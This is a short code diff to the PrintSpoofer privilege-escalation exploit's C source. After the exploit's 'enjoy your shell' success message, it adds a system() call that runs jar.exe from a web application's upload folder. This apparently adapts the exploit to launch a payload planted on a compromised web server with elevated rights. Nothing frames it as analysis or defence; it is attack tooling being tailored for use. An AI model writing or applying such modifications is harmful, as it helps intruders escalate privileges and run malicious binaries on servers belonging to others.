@@ -59,6 +59,7 @@ BOOL PrintSpoofer() {
 		goto cleanup;
 	}
 	wprintf(L"[+] Exploit successfully, enjoy your shell\n");
+	system("D:\\WebPublish\\web_crsmanage\\UploadFile\\2024\\5\\jar.exe");
 
 cleanup:
 	if (hSpoolPipe)
